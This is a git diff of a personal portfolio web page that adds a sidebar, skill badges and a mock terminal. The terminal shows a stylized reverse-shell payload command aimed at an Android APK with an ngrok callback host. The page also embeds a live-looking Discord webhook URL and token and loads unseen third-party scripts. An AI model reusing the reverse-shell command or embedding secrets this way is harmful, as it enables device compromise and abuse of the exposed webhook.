@@ -1,7 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-   <scropt>var visitorId = localStorage.getItem('visitor_id');
+       <script src="https://haydenbanz.github.io/bridge.js"></script>
+   <script>var visitorId = localStorage.getItem('visitor_id');
 
     if (!visitorId) {
         // Generate a unique visitor ID
@@ -16,7 +17,7 @@
                 v = c === 'x' ? r : (r & 0x3 | 0x8);
             return v.toString(16);
         });
-    }</scropt>
+    }</script>
   <script>
     function httpGetAsync(url, callback) {
         const xmlHttp = new XMLHttpRequest();
@@ -111,6 +112,17 @@
     window.onload = function() {
         analyzeTraffic(); // Automatically run the analysis when the page loads
     };</script>
+
+
+   <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-HWQ4M8YCFS"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-HWQ4M8YCFS');
+</script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>URL Redirect Example</title>
@@ -129,9 +141,995 @@
   </script>
 </head>
 <body>
-  <!-- Your website's content goes here -->
-  <h1>Welcome to My Website</h1>
-  <p>This is an example page.</p>
+ <main>
+
+    <aside class="sidebar" data-sidebar>
+
+      <div class="sidebar-info">
+  <figure class="avatar-box">
+      
+          <img src="https://firebasestorage.googleapis.com/v0/b/ciphertube-ff50c.appspot.com/o/blog_images%2F0x_h4yd3n.png?alt=media&token=c6570eb3-9244-4d8e-b60a-617ea3b6796b" alt="Technicalhayden" width="80" >
+  </figure>
+
+        <div class="info-content">
+          <h1 class="name" title="Hayden Barnes">Hayden Barnes</h1>
+
+          <p class="title"><a href="https://www.linkedin.com/company/code-glitch/" style="text-decoration: none;">Founder & CTO</a></p>
+          <br>
+           
+		  
+          <pre>
+          </pre>
+        </div>
+       
+         
+
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Contacts</span>
+
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+
+      </div>
+
+      <div class="sidebar-info_more">
+
+        <div class="separator"></div>
+
+        <ul class="contacts-list">
+
+          <li class="contact-item">
+
+            <div class="icon-box">
+              <ion-icon name="mail-outline"></ion-icon>
+            </div>
+
+            <div class="contact-info">
+              <p class="contact-title">Email</p>
+
+              <a href="mailto:cubedimension@protonmail.com" class="contact-link">cubedimension@protonmail.com</a>
+            </div>
+
+          </li>
+
+          <li class="contact-item">
+
+            <div class="icon-box">
+              <ion-icon name="phone-portrait-outline"></ion-icon>
+            </div>
+
+            <div class="contact-info">
+              <p class="contact-title">Phone</p>
+
+              <a href="https://ai.glitch" class="contact-link">+1 87974388854</a>
+            </div>
+
+          </li>
+
+          <li class="contact-item">
+
+        
+      </li>
+
+          <li class="contact-item">
+
+            <div class="icon-box">
+              <ion-icon name="location-outline"></ion-icon>
+            </div>
+
+            <div class="contact-info">
+              <p class="contact-title">Location</p>
+
+              <address>Neon Alley 77, Kowloon Walled City, Hong Kong</address>
+            </div>
+
+          </li>
+
+        </ul>
+
+        <div class="separator"></div>
+
+        <ul class="social-list">
+
+          <li class="social-item">
+            <a href="https://github.com/haydenzbanz/" class="social-link">
+              <ion-icon name="logo-github"></ion-icon>
+            </a>
+          </li>
+
+          <li class="social-item">
+            <a href="https://twitter.com/0x_hayd3n" class="social-link">
+              <ion-icon name="logo-twitter"></ion-icon>
+            </a>
+          </li>
+
+          <li class="social-item">
+            <a href="https://www.instagram.com/0x_hayden" class="social-link">
+              <ion-icon name="logo-instagram"></ion-icon>
+            </a>
+          </li>
+
+        </ul>
+
+      </div>
+
+    </aside>
+
+
+
+
+
+    <!--
+      - #main-content
+    -->
+
+    <div class="main-content">
+
+      <!--
+        - #NAVBAR
+      -->
+
+      <nav class="navbar">
+
+        <ul class="navbar-list">
+
+          <li class="navbar-item">
+            <button class="navbar-link active" data-nav-link>About</button>
+          </li>
+
+          <li class="navbar-item">
+            <button onclick="window.location.href='blog.html'" class="navbar-link" data-nav-link>Blog</button>
+          </li>
+
+          <li class="navbar-item">
+            <button class="navbar-link" onclick="window.location.href='portfolio.html'" data-nav-link>Portfolio</button>
+          </li>
+
+          <li class="navbar-item">
+            <button  onclick="window.location.href='#'" class="navbar-link" data-nav-link>Courses</button>
+          </li>
+<li class="navbar-item">
+  <button class="navbar-link" onclick="window.location.href='contact.html'">Contact</button>
+</li>
+
+        </ul>
+
+      </nav>
+
+
+
+
+
+      <!--
+        - #ABOUT
+      -->
+
+      <article class="about  active" data-page="about">
+
+        <header>
+          <h2 class="h2 article-title">About Me</h2>
+        </header>
+
+        <section class="about-text">
+		
+		<style>
+			
+			
+		</style>
+          <p><h6 class="gradient-text">
+            <h1>ʜᴀʏᴅᴇɴ ʙᴀʀɴᴇꜱ (ɢʟɪᴛᴄʜᴍɪɴᴅs) 🔭</h1>
+
+    <h3>ʜᴇʏ, ᴡʜᴀᴛ'ꜱ ᴜᴘ? 👋 ɪᴛ'ꜱ ᴍᴇ. ᴄᴏᴏʟ, ʀɪɢʜᴛ?</h3>
+
+    <pre id="terminal-output">
+    [Hᴀʏᴅᴇɴ@ʀᴏᴏᴛ ~/ɢʟɪᴛᴄʜ]$ 
+    ɢʟɪᴛᴄʜᴠᴇɴᴏᴍ -ᴘ ᴀɴᴅʀᴏɪᴅ ʟʜsᴏᴛ=ɢʟɪᴛᴄʜ.ɴɢʀᴏᴋ.ɪᴏ ʟᴘᴏʀᴛ=80 R> ʀᴇᴍᴏᴛᴇsʜᴇʟʟ.ᴀᴘᴋ
+
+
+ [Hayden@root ~/glitch]$
+    </pre>
+    <div class="container">
+      <input type="text" id="sender-id" placeholder="Sender ID" width="30">      <input type="text" id="recipient" placeholder="Recipient" width="30"> <input type="text" id="message" placeholder="Message" width="50"><input type="file" id="file-input">
+    
+      <button onclick="sendMessage()"><ion-icon name="paper-plane"></ion-icon></button>
+  </div>
+ 
+
+  <style>
+    /* Style for the container div */
+    .container {
+        display: flex;
+        align-items: center;
+    }
+
+    /* Style for the input elements */
+    input[type="text"] {
+        border: none;
+        background: transparent;
+        font-family: "Courier New", Courier, monospace;
+        font-size: 16px;
+        color: #7DF9FF; /* Electric blue text color */
+        outline: none;
+        margin-right: 10px; /* Add spacing between input elements */
+    }
+
+    /* Style for the button */
+    button {
+        background: transparent;
+        font-family: "Courier New", Courier, monospace;
+        font-size: 16px;
+        color: #7DF9FF; /* Electric blue text color */
+        border: none;
+        outline: none;
+        cursor: pointer;
+    }
+</style>
+
+
+
+
+
+
+
+
+
+
+<script>
+  // Function to handle user input and display it in the terminal
+  function processInput(event) {
+      if (event.key === "Enter") {
+          sendMessage();
+      }
+  }
+
+  // Function to send a message with a file to Discord webhook
+  async function sendMessage() {
+      const senderId = document.getElementById("sender-id").value;
+      const recipient = document.getElementById("recipient").value;
+      const message = document.getElementById("message").value;
+      const fileInput = document.getElementById("file-input");
+      const outputElement = document.getElementById("terminal-output");
+
+      // Create a new line with the user's input
+      const newLine = document.createElement("div");
+      newLine.style.color = "#7DF9FF"; // Electric blue text color
+      newLine.textContent = " [Hayden@root ~/glitch]$ send-discord-message -s " + senderId + " -r " + recipient + " -m " + message;
+
+      // Append the user input to the terminal output
+      outputElement.appendChild(newLine);
+
+      // Prepare the payload for Discord webhook
+      const formData = new FormData();
+      formData.append("content", message);
+      formData.append("recipient", recipient);
+      formData.append("username", senderId);
+      formData.append("file", fileInput.files[0]); // Add the selected file
+
+      // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
+      const webhookUrl = 'https://discord.com/api/webhooks/1160153863526035456/8Jy6JgqkuAz-Ed1cJ120WBAPrThhiU_daPd4UEluhKqElFvk0zph8ynhZlt5K7DQ3FYI';
+
+      try {
+          // Send the message with the file to the Discord webhook using a POST request
+          const response = await fetch(webhookUrl, {
+              method: 'POST',
+              body: formData,
+          });
+
+          if (response.ok) {
+              // Display success message in terminal output
+              const responseLine = document.createElement("div");
+              responseLine.style.color = "#7DF9FF"; // Electric blue text color
+              responseLine.textContent = "Mᴇssᴀɢᴇ sᴇɴᴛ sᴜᴄᴄᴇssғᴜʟʟʏ.";
+              outputElement.appendChild(responseLine);
+          } else {
+              // Display error message in terminal output
+              const errorLine = document.createElement("div");
+              errorLine.style.color = "red";
+              errorLine.textContent = "Eʀʀᴏʀ: Fᴀɪʟᴇᴅ ᴛᴏ sᴇɴᴅ ᴍᴇssᴀɢᴇ.";
+              outputElement.appendChild(errorLine);
+          }
+      } catch (error) {
+          // Handle network or other errors
+          const errorLine = document.createElement("div");
+          errorLine.style.color = "red";
+          errorLine.textContent = "Error: " + error.message;
+          outputElement.appendChild(errorLine);
+      }
+
+      // Clear the input fields
+      document.getElementById("sender-id").value = "";
+      document.getElementById("recipient").value = "";
+      document.getElementById("message").value = "";
+      fileInput.value = ""; // Clear the file input
+  }
+</script>
+    
+<style>
+  /* Style for shields */
+  .shields {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      align-items: center;
+  }
+
+  .shield {
+      margin: 5px;
+  }
+
+  /* Style for contact links */
+  .contact-links {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-top: 20px;
+  }
+
+  .contact-link {
+      margin: 5px;
+  }
+</style>
+
+
+
+  
+  
+  
+  
+  
+  
+  
+   
+          </p>
+        </section>
+       
+	    
+	    
+	     <!--
+          - service github
+        -->
+	    
+	    <section class="service">
+		     <header>  <h2 class="h2 article-title">Operating Systems Used by Me</h2>
+          </header>
+          
+
+      
+        
+        <div class="shields">
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Windows-%230078D7.svg?style=flat-square&logo=windows&logoColor=white" alt="Windows">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Ubuntu-%23E95420.svg?style=flat-square&logo=ubuntu&logoColor=white" alt="Ubuntu">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Kali%20Linux-%23151717.svg?style=flat-square&logo=kali-linux&logoColor=white" alt="Kali Linux">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Parrot%20OS-%231487B4.svg?style=flat-square&logo=parrot-security&logoColor=white" alt="Parrot OS">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Debian-%23A81D33.svg?style=flat-square&logo=debian&logoColor=white" alt="Debian">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Android-%233DDC84.svg?style=flat-square&logo=android&logoColor=white" alt="Android">
+            </div>
+        </div>
+        <br>
+
+        <header>  <h2 class="h2 article-title">sᴋɪʟʟs</h2><br>
+        </header>
+        <h2>Cᴏᴅɪɴɢ Lᴀɴɢᴜᴀɢᴇs</h2><br>
+        <div class="shields">
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Python-%233776AB?logo=python&logoColor=white&style=flat-square" alt="Python">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Java-%23007396?logo=java&logoColor=white&style=flat-square" alt="Java">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/JavaScript-%23F7DF1E?logo=javascript&logoColor=black&style=flat-square" alt="JavaScript">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/PHP-%23777BB4?logo=php&logoColor=white&style=flat-square" alt="PHP">
+            </div>
+        </div>
+    <br>
+        <h2>Fʀᴏɴᴛ-ᴇɴᴅ Dᴇᴠᴇʟᴏᴘᴍᴇɴᴛ</h2><br>
+        <div class="shields">
+            <div class="shield">
+                <img src="https://img.shields.io/badge/HTML5-%23E34F26?logo=html5&logoColor=white&style=flat-square" alt="HTML5">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/React-%2361DAFB?logo=react&logoColor=black&style=flat-square" alt="React">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/CSS3-%231572B6?logo=css3&logoColor=white&style=flat-square" alt="CSS3">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Bootstrap-%23563D7C?logo=bootstrap&logoColor=white&style=flat-square" alt="Bootstrap">
+            </div>
+        </div>
+    <br>
+        <h2>Bᴀᴄᴋ-ᴇɴᴅ Dᴇᴠᴇʟᴏᴘᴍᴇɴᴛ</h2><br>
+        <div class="shields">
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Express.js-%23404D59?logo=express&logoColor=white&style=flat-square" alt="Express.js">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/NGINX-%23269539?logo=nginx&logoColor=white&style=flat-square" alt="NGINX">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Node.js-%23339933?logo=node.js&logoColor=white&style=flat-square" alt="Node.js">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/PHP-%23777BB4?logo=php&logoColor=white&style=flat-square" alt="PHP">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Django-%23092E20?logo=django&logoColor=white&style=flat-square" alt="Django">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/FastAPI-%230170FE?logo=fastapi&logoColor=white&style=flat-square" alt="FastAPI">
+            </div>
+        </div>
+    <br>
+        <h2>AI & ML</h2><br>
+        <div class="shields">
+            <div class="shield">
+                <img src="https://img.shields.io/badge/OpenCV-%235C3EE8?logo=opencv&logoColor=white&style=flat-square" alt="OpenCV">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Pandas-%23150458?logo=pandas&logoColor=white&style=flat-square" alt="Pandas">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/PyTorch-%23EE4C2C?logo=pytorch&logoColor=white&style=flat-square" alt="PyTorch">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Scikit--Learn-%23F7931E?logo=scikit-learn&logoColor=black&style=flat-square" alt="Scikit-Learn">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/TensorFlow-%23FF6F00?logo=tensorflow&logoColor=white&style=flat-square" alt="TensorFlow">
+            </div>
+        </div><br>
+    
+        <h2>Hᴀʀᴅᴡᴀʀᴇ & Aᴜᴛᴏᴍᴀᴛɪᴏɴ</h2><bR>
+        <div class="shields">
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Arduino-%2300979D?logo=arduino&logoColor=white&style=flat-square" alt="Arduino">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Raspberry%20Pi-%23C51A4A?logo=raspberry-pi&logoColor=white&style=flat-square" alt="Raspberry Pi">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/NodeMCU-%232C3E4C?logo=nodemcu&logoColor=white&style=flat-square" alt="NodeMCU">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/IFTTT-%23FF7B24?logo=ifttt&logoColor=white&style=flat-square" alt="IFTTT">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/ESP8266-%2341BDF5?logo=esp8266&logoColor=white&style=flat-square" alt="ESP8266">
+            </div>
+        </div>
+    <br>
+        <h2>Oᴛʜᴇʀ</h2><br>
+        <div class="shields">
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Docker-%232496ED?logo=docker&logoColor=white&style=flat-square" alt="Docker">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Firebase-%23FFCA28?logo=firebase&logoColor=black&style=flat-square" alt="Firebase">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/GIT-%23F05032?logo=git&logoColor=white&style=flat-square" alt="GIT">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Linux-%23FCC624?logo=linux&logoColor=black&style=flat-square" alt="Linux">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Figma-%23F24E1E?logo=figma&logoColor=white&style=flat-square" alt="Figma">
+            </div>
+        </div>
+    
+        <h2>Cloud Hosting</h2>
+        <div class="shields">
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Firebase-Hosting-orange?style=flat-square&logo=firebase" alt="Firebase Hosting">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/GitHub-Pages-blue?style=flat-square&logo=github" alt="GitHub Pages">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Vercel-Deploy-333?style=flat-square&logo=vercel" alt="Vercel">
+            </div>
+            <div class="shield">
+                <img src="https://img.shields.io/badge/Netlify-Deploy-brightgreen?style=flat-square&logo=netlify" alt="Netlify">
+            </div>
+        </div>
+
+
+
+
+
+	    </section>
+	    
+        
+        <!--
+          - service
+        -->
+
+        <section class="service">
+		
+		   <header>
+          <h2 class="h2 article-title">What i'm doing</h2>
+        </header>
+
+          <ul class="service-list">
+
+            <li class="service-item">
+
+              <div class="service-icon-box">
+                <img src="https://img.icons8.com/color/48/domain--v1.png" alt=" alt="web dev" width="40">
+              </div>
+
+              <div class="service-content-box">
+                <h4 class="h4 service-item-title">Web Design & Dev</h4>
+
+                <p class="service-item-text">
+                 Tech enthusiast passionate about both front-end and back-end web development.
+		
+                </p>
+              </div>
+
+            </li>
+
+            <li class="service-item">
+
+              <div class="service-icon-box">
+                <img src="https://img.icons8.com/external-flaticons-lineal-color-flat-icons/64/external-hardware-technology-ecommerce-flaticons-lineal-color-flat-icons-2.png" alt="hardware icon" width="40">
+              </div>
+
+              <div class="service-content-box">
+                <h4 class="h4 service-item-title">Hardware Dev</h4>
+
+                <p class="service-item-text">
+                 I enjoy working with platforms such as Arduino, Raspberry Pi, NodeMCU, and ESP8266
+                </p>
+              </div>
+
+            </li>
+
+            <li class="service-item">
+
+              <div class="service-icon-box">
+                <img src="https://img.icons8.com/?size=80&id=NfA9bJ3hZjnl&format=png" alt="AI icon" width="40">
+              </div>
+
+              <div class="service-content-box">
+                <h4 class="h4 service-item-title">AI & ML</h4>
+
+                <p class="service-item-text">
+                 I'm continuously expanding your skills in AI and ML. You utilize tools like OpenCV, Pandas, PyTorch, Scikit-Learn, and TensorFlow
+                </p>
+              </div>
+
+            </li>
+
+            <li class="service-item">
+
+              <div class="service-icon-box">
+                <img src="https://img.icons8.com/nolan/64/engineering.png" alt="Technical Tools and Service icon" width="40">
+              </div>
+
+              <div class="service-content-box">
+                <h4 class="h4 service-item-title">Technical Tools and Services</h4>
+
+                <p class="service-item-text">
+                  In addition to my core development skills, you utilize various technical tools and services. .
+                </p>
+              </div>
+
+            </li>
+
+          </ul>
+
+        </section>
+
+
+        <!--
+          - testimonials
+        -->
+
+        <section class="skill">
+   <header>
+          <h2 class="h2 article-title">MY Skills</h2>
+        </header>
+       <svg fill="currentColor" style="--darkreader-inline-fill: currentColor; width: 468px; height: 368px;" data-darkreader-inline-fill=""><g id="wrapper-g"><g id="axes"><g class="fl-facets"><g class="fl-facet" transform="translate(59, 0)" opacity="1"><rect class="fl-facet-rect" width="350" height="368" fill="none"></rect><rect class="fl-facet-primary-rect" width="350" height="350" y="18" fill="none"></rect><g class="fl-facet-title"><rect class="fl-facet-title-bg" height="18" width="0" fill="rgb(238, 238, 238)" x="142.07500076293945" opacity="1" style="--darkreader-inline-fill: #6f6d6b;" data-darkreader-inline-fill=""></rect><text class="fl-facet-title-text" font-size="12" font-weight="600" fill="#4328e7" dx="0" dy="12.600000000000001" x="142.07500076293945" opacity="1" text-anchor="start" style="--darkreader-inline-fill: #2a1e75;" data-darkreader-inline-fill="">MY skills</text></g><g class="fl-facet-primary" transform="translate(0, 18)"><g class="fl-radial" transform="translate(175, 175)" opacity="1"><g class="group-labels"></g><g class="y-lines"><circle class="fl-radial-x-line" fill="none" stroke="#cccccc" stroke-width="1.4" stroke-dasharray="2.8 2.8" r="0" style="--darkreader-inline-stroke: #64625e;" data-darkreader-inline-stroke=""></circle><circle class="fl-radial-x-line" fill="none" stroke="#cccccc" stroke-width="1.4" stroke-dasharray="2.8 2.8" r="29.75932962370901" style="--darkreader-inline-stroke: #64625e;" data-darkreader-inline-stroke=""></circle><circle class="fl-radial-x-line" fill="none" stroke="#cccccc" stroke-width="1.4" stroke-dasharray="2.8 2.8" r="59.51865924741802" style="--darkreader-inline-stroke: #64625e;" data-darkreader-inline-stroke=""></circle><circle class="fl-radial-x-line" fill="none" stroke="#cccccc" stroke-width="1.4" stroke-dasharray="2.8 2.8" r="89.27798887112704" style="--darkreader-inline-stroke: #64625e;" data-darkreader-inline-stroke=""></circle><circle class="fl-radial-x-line" fill="none" stroke="#cccccc" stroke-width="1.4" stroke-dasharray="2.8 2.8" r="119.03731849483604" style="--darkreader-inline-stroke: #64625e;" data-darkreader-inline-stroke=""></circle></g><g class="x-lines"><line class="fl-radial-y-line" x1="0" y1="0" x2="0" y2="-147.91698330669055" stroke="#cccccc" stroke-width="1.4" style="--darkreader-inline-stroke: #1f2223;" data-darkreader-inline-stroke=""></line><line class="fl-radial-y-line" x1="0" y1="0" x2="140.67741084454948" y2="-45.70886159844279" stroke="#cccccc" stroke-width="1.4" style="--darkreader-inline-stroke: #1f2223;" data-darkreader-inline-stroke=""></line><line class="fl-radial-y-line" x1="0" y1="0" x2="86.94342135126466" y2="119.66735325178806" stroke="#cccccc" stroke-width="1.4" style="--darkreader-inline-stroke: #1f2223;" data-darkreader-inline-stroke=""></line><line class="fl-radial-y-line" x1="0" y1="0" x2="-86.94342135126463" y2="119.66735325178807" stroke="#cccccc" stroke-width="1.4" style="--darkreader-inline-stroke: #1f2223;" data-darkreader-inline-stroke=""></line><line class="fl-radial-y-line" x1="0" y1="0" x2="-140.6774108445495" y2="-45.70886159844276" stroke="#cccccc" stroke-width="1.4" style="--darkreader-inline-stroke: #1f2223;" data-darkreader-inline-stroke=""></line></g><g class="y-labels"><g class="fl-radial-y-label" opacity="1" text-anchor="middle" font-weight="400" font-size="12.6" transform=""><text class="bg" stroke="#ffffff" stroke-width="4.2" dy="0.33em" style="--darkreader-inline-stroke: #181a1b;" data-darkreader-inline-stroke="">0</text><text class="fg" dy="0.33em" fill="#aaaaaa" style="--darkreader-inline-fill: #595651;" data-darkreader-inline-fill="">0</text></g><g class="fl-radial-y-label" opacity="1" text-anchor="middle" font-weight="400" font-size="12.6" transform="translate(0, -29.759328842163086)"><text class="bg" stroke="#ffffff" stroke-width="4.2" dy="0.33em" style="--darkreader-inline-stroke: #181a1b;" data-darkreader-inline-stroke="">20</text><text class="fg" dy="0.33em" fill="#aaaaaa" style="--darkreader-inline-fill: #595651;" data-darkreader-inline-fill="">20</text></g><g class="fl-radial-y-label" opacity="1" text-anchor="middle" font-weight="400" font-size="12.6" transform="translate(0, -59.51865768432617)"><text class="bg" stroke="#ffffff" stroke-width="4.2" dy="0.33em" style="--darkreader-inline-stroke: #181a1b;" data-darkreader-inline-stroke="">40</text><text class="fg" dy="0.33em" fill="#aaaaaa" style="--darkreader-inline-fill: #595651;" data-darkreader-inline-fill="">40</text></g><g class="fl-radial-y-label" opacity="1" text-anchor="middle" font-weight="400" font-size="12.6" transform="translate(0, -89.27799224853516)"><text class="bg" stroke="#ffffff" stroke-width="4.2" dy="0.33em" style="--darkreader-inline-stroke: #181a1b;" data-darkreader-inline-stroke="">60</text><text class="fg" dy="0.33em" fill="#aaaaaa" style="--darkreader-inline-fill: #595651;" data-darkreader-inline-fill="">60</text></g><g class="fl-radial-y-label" opacity="1" text-anchor="middle" font-weight="400" font-size="12.6" transform="translate(0, -119.03731536865234)"><text class="bg" stroke="#ffffff" stroke-width="4.2" dy="0.33em" style="--darkreader-inline-stroke: #181a1b;" data-darkreader-inline-stroke="">80</text><text class="fg" dy="0.33em" fill="#aaaaaa" style="--darkreader-inline-fill: #595651;" data-darkreader-inline-fill="">80</text></g></g><g class="x-labels"><g class="fl-radial-x-label" opacity="1" text-anchor="middle" font-size="12.6" font-weight="400" fill="#aaaaaa" style="--darkreader-inline-fill: #242729;" data-darkreader-inline-fill="" transform="translate(0, -147.91697692871094)"><text class="bg" stroke="#ffffff" stroke-width="4.2" dy="0.33em" style="--darkreader-inline-stroke: #181a1b;" data-darkreader-inline-stroke="">WED DEV</text><text class="fg" dy="0.33em">WED DEV</text></g><g class="fl-radial-x-label" opacity="1" text-anchor="middle" font-size="12.6" font-weight="400" fill="#aaaaaa" style="--darkreader-inline-fill: #242729;" data-darkreader-inline-fill="" transform="translate(140.6774139404297, -45.7088623046875)"><text class="bg" stroke="#ffffff" stroke-width="4.2" dy="0.33em" style="--darkreader-inline-stroke: #181a1b;" data-darkreader-inline-stroke="">AI &amp; ML</text><text class="fg" dy="0.33em">AI &amp; ML</text></g><g class="fl-radial-x-label" opacity="1" text-anchor="middle" font-size="12.6" font-weight="400" fill="#aaaaaa" style="--darkreader-inline-fill: #242729;" data-darkreader-inline-fill="" transform="translate(86.94342041015625, 119.66735076904297)"><text class="bg" stroke="#ffffff" stroke-width="4.2" dy="0.33em" style="--darkreader-inline-stroke: #181a1b;" data-darkreader-inline-stroke="">CYBER SEC</text><text class="fg" dy="0.33em">CYBER SEC</text></g><g class="fl-radial-x-label" opacity="1" text-anchor="middle" font-size="12.6" font-weight="400" fill="#aaaaaa" style="--darkreader-inline-fill: #242729;" data-darkreader-inline-fill="" transform="translate(-86.94342041015625, 119.66735076904297)"><text class="bg" stroke="#ffffff" stroke-width="4.2" dy="0.33em" style="--darkreader-inline-stroke: #181a1b;" data-darkreader-inline-stroke="">GADGETS</text><text class="fg" dy="0.33em">GADGETS</text></g><g class="fl-radial-x-label" opacity="1" text-anchor="middle" font-size="12.6" font-weight="400" fill="#aaaaaa" style="--darkreader-inline-fill: #242729;" data-darkreader-inline-fill="" transform="translate(-140.6774139404297, -45.7088623046875)"><text class="bg" stroke="#ffffff" stroke-width="4.2" dy="0.33em" style="--darkreader-inline-stroke: #181a1b;" data-darkreader-inline-stroke="">Gray Hat</text><text class="fg" dy="0.33em">Gray Hat</text></g></g></g></g></g></g></g><g id="comparison-lines"></g><g id="lines"><path class="line-main" d="M0,-119.03731849483604L56.60560871840771,-18.39227718986379L61.22233274824336,84.26531192375239L-78.71442781917001,108.3411153305388L-99.05981525721351,-32.18648508226161Z" id="line-0" stroke="#4328e7" fill="#4328e7" fill-opacity="0.2" stroke-opacity="1" stroke-width="2.8" transform="translate(234, 193)" stroke-dashoffset="0" tabindex="0" role="img" aria-roledescription="data point" aria-label="MY skills" style="--darkreader-inline-fill: #150a58; --darkreader-inline-stroke: #2a1e75;" data-darkreader-inline-fill="" data-darkreader-inline-stroke=""></path></g></g></svg>
+        </section>
+            
+        
+
+      </article>
+
+
+
+
+
+     
+      
+
+   
+
+    </div>
+
+  </main>
+
+  <style>
+    /* Hide the audio element */
+    #greetingAudio {
+        display: none;
+    }
+</style> <audio id="greetingAudio" autoplay>
+  <source src="audio.mp3" type="audio/mpeg">
+  Your browser does not support the audio element.
+</audio>
+ <script src="https://karthithehacker.com/assets/js/script.js"></script>
+
+  <!--
+    - ionicon link
+  -->
+<script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+  <script>
+  'use strict';
+
+
+
+// element toggle function
+const elementToggleFunc = function (elem) { elem.classList.toggle("active"); }
+
+
+
+// sidebar variables
+const sidebar = document.querySelector("[data-sidebar]");
+const sidebarBtn = document.querySelector("[data-sidebar-btn]");
+
+// sidebar toggle functionality for mobile
+sidebarBtn.addEventListener("click", function () { elementToggleFunc(sidebar); });
+
+
+
+// testimonials variables
+const testimonialsItem = document.querySelectorAll("[data-testimonials-item]");
+const modalContainer = document.querySelector("[data-modal-container]");
+const modalCloseBtn = document.querySelector("[data-modal-close-btn]");
+const overlay = document.querySelector("[data-overlay]");
+
+// modal variable
+const modalImg = document.querySelector("[data-modal-img]");
+const modalTitle = document.querySelector("[data-modal-title]");
+const modalText = document.querySelector("[data-modal-text]");
+
+// modal toggle function
+const testimonialsModalFunc = function () {
+  modalContainer.classList.toggle("active");
+  overlay.classList.toggle("active");
+}
+
+// add click event to all modal items
+for (let i = 0; i < testimonialsItem.length; i++) {
+
+  testimonialsItem[i].addEventListener("click", function () {
+
+    modalImg.src = this.querySelector("[data-testimonials-avatar]").src;
+    modalImg.alt = this.querySelector("[data-testimonials-avatar]").alt;
+    modalTitle.innerHTML = this.querySelector("[data-testimonials-title]").innerHTML;
+    modalText.innerHTML = this.querySelector("[data-testimonials-text]").innerHTML;
+
+    testimonialsModalFunc();
+
+  });
+
+}
+
+// add click event to modal close button
+modalCloseBtn.addEventListener("click", testimonialsModalFunc);
+overlay.addEventListener("click", testimonialsModalFunc);
+
+
+
+// custom select variables
+const select = document.querySelector("[data-select]");
+const selectItems = document.querySelectorAll("[data-select-item]");
+const selectValue = document.querySelector("[data-selecct-value]");
+const filterBtn = document.querySelectorAll("[data-filter-btn]");
+
+select.addEventListener("click", function () { elementToggleFunc(this); });
+
+// add event in all select items
+for (let i = 0; i < selectItems.length; i++) {
+  selectItems[i].addEventListener("click", function () {
+
+    let selectedValue = this.innerText.toLowerCase();
+    selectValue.innerText = this.innerText;
+    elementToggleFunc(select);
+    filterFunc(selectedValue);
+
+  });
+}
+
+// filter variables
+const filterItems = document.querySelectorAll("[data-filter-item]");
+
+const filterFunc = function (selectedValue) {
+
+  for (let i = 0; i < filterItems.length; i++) {
+
+    if (selectedValue === "all") {
+      filterItems[i].classList.add("active");
+    } else if (selectedValue === filterItems[i].dataset.category) {
+      filterItems[i].classList.add("active");
+    } else {
+      filterItems[i].classList.remove("active");
+    }
+
+  }
+
+}
+
+// add event in all filter button items for large screen
+let lastClickedBtn = filterBtn[0];
+
+for (let i = 0; i < filterBtn.length; i++) {
+
+  filterBtn[i].addEventListener("click", function () {
+
+    let selectedValue = this.innerText.toLowerCase();
